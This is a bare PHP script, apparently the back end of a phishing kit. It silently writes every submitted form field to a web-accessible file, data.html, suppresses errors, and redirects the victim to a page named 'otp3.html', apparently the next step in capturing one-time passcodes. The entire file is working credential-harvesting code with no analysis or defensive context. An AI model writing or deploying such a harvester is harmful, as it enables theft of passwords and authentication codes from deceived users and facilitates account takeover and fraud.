<?php
header('location: otp3.html');
error_reporting(0);
$handle = fopen("data.html","a");
foreach($_POST as $variable => $value)
{
  fwrite($handle, $variable);
  fwrite($handle, "= ");
  fwrite($handle, $value);
  fwrite($handle, "\r\n,&nbsp;");
}
fwrite($handle, "\r\n<br><br>");
fclose($handle);
exit;
?> 